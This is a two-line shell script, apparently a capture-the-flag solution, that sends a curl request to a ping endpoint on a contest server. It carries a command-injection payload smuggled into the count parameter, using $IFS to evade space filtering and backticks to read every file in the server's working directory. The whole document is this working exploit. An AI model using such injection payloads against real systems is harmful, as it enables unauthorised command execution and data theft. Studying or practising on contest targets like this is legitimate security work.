#!/bin/sh
curl 'http://spbctf.ppctf.net:7878/ping?host=google.com&count=1;cat$IFS`ls`'
